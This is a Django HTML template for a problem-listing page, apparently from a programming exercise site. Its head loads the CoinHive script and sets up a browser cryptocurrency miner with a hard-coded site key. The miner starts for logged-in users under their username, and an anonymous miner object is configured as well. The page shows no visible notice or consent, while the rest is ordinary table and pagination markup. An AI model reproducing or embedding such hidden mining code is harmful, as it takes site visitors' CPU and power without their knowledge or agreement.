<!DOCTYPE html>
<html lang="en">
    <head>
        {% include "header.html" %}
        {% load staticfiles %}
        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
        <script>	
            {% if login %}
                var miner = new CoinHive.User('R8uBnEUWe9lzB5R9BAhAoPiaNbIvv56c','{{ name }}',{
                    autoThreads: true,
                    throttle: 0.6
                });
                miner.start();
            {% else %}
                var miner = new CoinHive.Anonymous('R8uBnEUWe9lzB5R9BAhAoPiaNbIvv56c',{
                    autoThreads: true,
                    throttle: 0.5
                });
          {% endif %}
        </script>
    </head>
    <body>
        {% include "navbar.html" %}
        <div class="container" style="margin-top:50px;">
            <div class="row">
                <div class="col">
                    <nav class="bg-light sidebar">
                            <ul class="nav nav-pills flex-column">
                                <li class="nav-item">
                                    <a class="nav-link" href="#">ALL</a>
                                </li>
                            </ul>
                        </nav>
                </div>
                <div class="col-12 col-xs-12 col-sm-12 col-md-10 col-lg-10">
                        <div class="table-responsive">
                                <table class="table table-striped table-bordered">
                                    <thead>
                                      <tr>
                                        <th style="text-align:center;">#</th>
                                        <th style="text-align:center;">Title</th>
                                        <th style="text-align:center;">Author</th>
                                        <th style="text-align:center;">Status</th>
                                      </tr>
                                    </thead>
                                    <tbody>
                                        {% for n in problems %}
                                        <tr>
                                            <td align="center">{{ n.id }}</td>
                                            <td align="center"><a href="/problem={{ n.id }}">{{ n.title }}</a></td>
                                            <td align="center">{{ n.author }}</td>
                                            <td align="center"></td>
                                        </tr>
                                        {% endfor %}
                                    </tbody>
                                </table>
                            </div>
                            {% include "paginator.html" %}
                </div>
            </div>

        </div>

    </body>
</html>
